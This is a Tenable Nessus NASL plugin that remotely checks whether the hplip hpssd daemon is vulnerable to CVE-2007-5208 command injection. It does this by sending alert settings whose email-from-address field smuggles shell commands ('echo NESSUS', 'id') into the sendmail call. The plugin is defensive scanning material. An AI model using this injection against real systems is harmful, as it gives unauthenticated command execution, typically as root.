#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(27054);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2007-5208");
  script_bugtraq_id(26054);
  script_osvdb_id(41693);

  script_name(english:"HP Linux Imaging and Printing Project (hplip) hpssd from Address Command Injection");
  script_summary(english:"Tries to run commands via hpssd");

 script_set_attribute(attribute:"synopsis", value:
"The remote service allows for arbitrary command execution." );
 script_set_attribute(attribute:"description", value:
"The version of the HP Linux Imaging and Printing System hpssd daemon
on the remote host fails to sanitize user-supplied input before
appending it to a commandline when calling sendmail.  Using a
specially crafted email address, an unauthenticated, remote attacker
can leverage this issue to execute arbitrary shell commands on the
remote host subject to the permissions under which the daemon
operates, typically root." );
 script_set_attribute(attribute:"see_also", value:"https://bugzilla.redhat.com/show_bug.cgi?id=319921" );
 script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/forum/forum.php?forum_id=746709" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to HPLIP 2.7.10 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_core", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'HPLIP hpssd.py From Address Arbitrary Command Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
 script_cwe_id(20);
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/10/15");
 script_set_attribute(attribute:"patch_publication_date", value: "2007/10/05");
 script_cvs_date("$Date: 2016/11/18 20:40:53 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:linux_imaging_and_printing_project");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");
  script_dependencies("find_service2.nasl");
  script_require_ports("Services/hpssd", 2207);

  exit(0);
}


port = get_kb_item("Services/hpssd");
if (!port) port = 2207;
if (!get_port_state(port)) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);


# Define some messages to send to hpssd.
user = SCRIPT_NAME;
#
# - alert settings to produce a success.
req1_safe = string(
  "username=", user, "\n",
  "email-alerts=true\n",
  "email-from-address=nobody 2>/dev/null; echo NESSUS\n",
  "email-to-addresses=nobody\n",
  "msg=setalerts\n"
);
# - alert settings to produce a failure.
cmd = "id";
req1_exploit = string(
  "username=", user, "\n",
  "email-alerts=true\n",
  "email-from-address=nobody 2>/dev/null;", cmd, ">&2\n",
  "email-to-addresses=nobody\n",
  "msg=setalerts\n"
);
# - send a test email.
req2 = string(
  "username=", user, "\n",
  "msg=testemail\n"
);


# Try to run a command.
# - need to register for alerts first.
send(socket:soc, data:req1_exploit);
res = recv(socket:soc, length:1024, min:19);
if (strlen(res) > 0 && "msg=setalertsresult" >< res && "result-code=0" >< res)
{
  # - try to send a test email.
  send(socket:soc, data:req2);
  res = recv(socket:soc, length:1024, min:9);

  # If the result code signals a failure...
  if (
    strlen(res) > 0 && 
    "msg=testemailresult" >< res && 
    "result-code=" >< res &&
    "result-code=0" >!< res
  )
  {
    # Make sure it's not just a problem running sendmail.
    send(socket:soc, data:req1_safe);
    res = recv(socket:soc, length:1024, min:19);
    if (
      strlen(res) > 0 && 
      "msg=setalertsresult" >< res && 
      "result-code=0" >< res
    )
    {
      # - try to send a test email.
      send(socket:soc, data:req2);
      res = recv(socket:soc, length:1024, min:9);

      # There's a problem if that was successful.
      if (
        strlen(res) > 0 && 
        "msg=testemailresult" >< res && 
        "result-code=0" >< res
      ) security_hole(port);
    }
  }
}
close(soc);
